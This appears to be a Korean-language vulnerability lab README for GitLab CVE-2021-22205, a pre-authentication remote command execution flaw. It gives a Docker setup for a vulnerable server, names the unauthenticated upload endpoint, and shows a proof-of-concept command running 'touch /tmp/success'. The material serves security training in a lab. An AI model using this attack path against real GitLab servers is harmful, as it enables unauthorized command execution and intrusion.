# GitLab 사전 인증 원격 명령 실행(CVE-2021-22205)
GitLab은 웹 기반 DevOps 라이프사이클 툴로 위키, 이슈 추적, 지속적인 통합 및 배포 파이프라인 기능을 제공하는 Git 저장소 관리자를 제공합니다.

GitLab CE/EE에서 11.9부터 버전에 영향을 미치는 문제가 발견되었습니다. GitLab에서 파일 구문 분석기로 전달되는 이미지 파일의 유효성을 제대로 검사하지 않아 인증되지 않은 원격 명령이 실행되었습니다.

References:
 - https://hackerone.com/reports/1154542
 - https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
 - https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
 - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml

Vulnerable environment
---
다음 명령을 실행하여 GitLab Community Server 13.10.1을 시작합니다:

```cmd
docker compose up -d
```
서버가 시작된 후 ```http://your-ip:8080```을 찾아 웹사이트를 확인합니다.

Exploit
---
api endpoint ```/ uploads/user```가 인증되지 않은 인터페이스입니다. poc.py 을 통해 서버를 공격합니다:

```python
python poc.py http://your-ip:8080 "touch /tmp/success"
```
[![image](https://github.com/won6c/whitehat-school-vulhub/blob/main/CVE-2021-22205/1.png)]

```touch /tmp/success```가 정상적으로 실행됐다

[![image](https://github.com/won6c/whitehat-school-vulhub/blob/main/CVE-2021-22205/2.png)]
